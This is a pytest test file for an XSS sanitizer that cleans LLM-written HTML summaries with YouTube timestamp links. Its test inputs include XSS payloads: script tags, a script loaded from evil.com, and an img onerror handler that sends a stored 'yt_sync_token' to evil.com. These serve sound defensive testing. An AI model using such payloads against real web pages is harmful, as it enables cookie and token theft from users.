"""Tests for XSS sanitization in renderer._sanitize_summary() — C1 fix."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from renderer import _sanitize_summary


# ── Malicious content must be stripped ──────────────────────────────────────

def test_script_tag_is_stripped():
    html = "<p>Hello</p><script>alert(document.cookie)</script>"
    result = _sanitize_summary(html)
    assert "<script>" not in result
    assert "alert" not in result


def test_script_tag_with_src_is_stripped():
    html = '<p>Text</p><script src="https://evil.com/x.js"></script>'
    result = _sanitize_summary(html)
    assert "<script" not in result


def test_onerror_attribute_is_stripped():
    html = '<p>Hi</p><img src="x" onerror="fetch(\'https://evil.com?t=\'+localStorage.getItem(\'yt_sync_token\'))">'
    result = _sanitize_summary(html)
    assert "onerror" not in result


def test_onclick_attribute_is_stripped():
    html = '<p>Hi</p><h3 onclick="alert(1)">Section</h3>'
    result = _sanitize_summary(html)
    assert "onclick" not in result


def test_javascript_href_is_stripped():
    html = '<a href="javascript:alert(1)">click me</a>'
    result = _sanitize_summary(html)
    assert "javascript:" not in result


def test_onload_on_body_is_stripped():
    html = '<p>text</p><body onload="evil()"></body>'
    result = _sanitize_summary(html)
    assert "onload" not in result


# ── Legitimate LLM output must be preserved ──────────────────────────────────

def test_h3_tag_is_preserved():
    html = "<h3>Introduction</h3><p>Body text.</p>"
    result = _sanitize_summary(html)
    assert "<h3>" in result
    assert "Introduction" in result


def test_p_tag_is_preserved():
    html = "<p>This is a paragraph.</p>"
    result = _sanitize_summary(html)
    assert "<p>" in result


def test_ul_li_tags_are_preserved():
    html = "<ul><li>First</li><li>Second</li></ul>"
    result = _sanitize_summary(html)
    assert "<ul>" in result
    assert "<li>" in result


def test_youtube_timestamp_link_is_preserved():
    html = (
        '<p>The author explains the main idea '
        '<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=83" class="ts-link">1:23</a>.'
        "</p>"
    )
    result = _sanitize_summary(html)
    assert "youtube.com" in result
    assert 'class="ts-link"' in result
    assert "1:23" in result


def test_none_input_returns_none():
    assert _sanitize_summary(None) is None


def test_empty_string_returns_none_or_empty():
    result = _sanitize_summary("")
    # Either None or empty string is acceptable; must not raise
    assert result is None or result == ""
